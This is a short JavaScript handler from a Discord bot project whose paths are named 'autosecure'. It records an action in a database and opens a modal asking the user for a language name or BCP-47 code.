const generate = require("../../../autosecure/utils/generate");
const { queryParams } = require("../../../db/database");
const modalBuilder = require("../../../autosecure/utils/utils/modalBuilder");
const { TextInputStyle } = require('discord.js');

module.exports = {
    name: "changelanguage",
    editautosecure: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|");

        let actionId = generate(32);
        await queryParams(
            `INSERT INTO actions (id, action) VALUES (?, ?)`,
            [actionId, `modalchangelanguage|${botnumber}|${ownerid}`]
        );

        const customModalId = `action|${actionId}`;

        interaction.showModal(modalBuilder(
            customModalId,
            `Change Language`,
            [
                {
                    setCustomId: 'language',
                    setMaxLength: 10,
                    setRequired: false,
                    setLabel: "Language name or BCP-47 code",
                    setPlaceholder: "e.g. en-US, Spanish",
                    setStyle: TextInputStyle.Short
                }
            ]
        ));
    }
};
